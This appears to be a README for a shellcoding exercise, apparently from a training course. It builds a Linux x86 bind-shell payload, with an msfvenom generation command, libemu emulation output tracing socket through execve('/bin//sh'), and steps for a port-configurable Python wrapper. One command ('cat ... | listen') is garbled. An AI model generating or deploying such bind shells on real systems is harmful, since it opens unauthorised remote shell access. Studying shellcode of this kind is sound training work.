# Exercise 1

## Usage

```
python3 wrapper.py $PORT
```

![Screenshot](images/wrapper/5.png)

If the port causes problems, a warning message appears:
![Screenshot](images/wrapper/6.png)




## Steps

Get "sctest" result (also using *libemu.sh* script in **scripts/** folder):
```
msfvenom -p linux/x86/shell_bind_tcp --platform=Linux -a x86 -f raw LPORT=8888 | ./sctest -vvv -Ss 10000 -G bindshell.dot

-------------------------------------

sh libemu.sh "msfvenom -p linux/x86/shell_bind_tcp --platform=Linux -a x86 -f raw LPORT=8888" bindshell | tee libemu_res/libemu_res.txt
```

Get hexadecimal values for every syscall (also using *syscallhex.sh* script in **scripts/** folder):
```
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | listen

printf "%x\n" 363

-------------------------------------

sh syscallhex.sh listen
```

Result:

```
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int bind (
     int sockfd = 14;
     struct sockaddr_in * my_addr = 0x00416fc2 => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 47138 (port=8888);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 0 (host=0.0.0.0);
             };
             char sin_zero = "       ";
         };
     int addrlen = 16;
) =  0;
int listen (
     int s = 14;
     int backlog = 0;
) =  0;
int accept (
     int sockfd = 14;
     sockaddr_in * addr = 0x00000000 => 
         none;
     int addrlen = 0x00000010 => 
         none;
) =  19;
int dup2 (
     int oldfd = 19;
     int newfd = 14;
) =  14;
int dup2 (
     int oldfd = 19;
     int newfd = 13;
) =  13;
int dup2 (
     int oldfd = 19;
     int newfd = 12;
) =  12;
int dup2 (
     int oldfd = 19;
     int newfd = 11;
) =  11;
int dup2 (
     int oldfd = 19;
     int newfd = 10;
) =  10;
int dup2 (
     int oldfd = 19;
     int newfd = 9;
) =  9;
int dup2 (
     int oldfd = 19;
     int newfd = 8;
) =  8;
int dup2 (
     int oldfd = 19;
     int newfd = 7;
) =  7;
int dup2 (
     int oldfd = 19;
     int newfd = 6;
) =  6;
int dup2 (
     int oldfd = 19;
     int newfd = 5;
) =  5;
int dup2 (
     int oldfd = 19;
     int newfd = 4;
) =  4;
int dup2 (
     int oldfd = 19;
     int newfd = 3;
) =  3;
int dup2 (
     int oldfd = 19;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 19;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 19;
     int newfd = 0;
) =  0;
int execve (
     const char * dateiname = 0x00416fb2 => 
           = "/bin//sh";
     const char * argv[] = [
           = 0x00416faa => 
               = 0x00416fb2 => 
                   = "/bin//sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
```


## Deleting NOPs

[socket] generates NOPs:

![Screenshot](images/1.png)

It is possible to solve it using the stack:

![Screenshot](images/2.png)

[accept_res] generates NOPs:

![Screenshot](images/3.png)

It is possible to solve it using the stack:

![Screenshot](images/4.png)

There is not NOPs anymore:

![Screenshot](images/5.png)



## Creating Python wrapper 

Get the shellcode:

![Screenshot](images/wrapper/1.png)

Change the "\\" to "\\\\":

![Screenshot](images/wrapper/2.png)

Detect where the port (8888 or 0x22b8 in hexadecimal) is being used:

![Screenshot](images/wrapper/3.png)

Substitute that value in the original shellcode for a variable:

![Screenshot](images/wrapper/4.png)


## Useful links
```
http://man7.org/linux/man-pages/man2/socket.2.html
https://stackoverflow.com/questions/19850082/using-nasm-and-tcp-sockets
http://man7.org/linux/man-pages/man2/socket.2.html
https://rosettacode.org/wiki/Sockets
http://www6.uniovi.es/cscene/CS5/CS5-05.html
https://stackoverflow.com/questions/48773917/why-creating-a-remote-shell-using-execve-doesnt-overwrite-file-descriptors-and
```
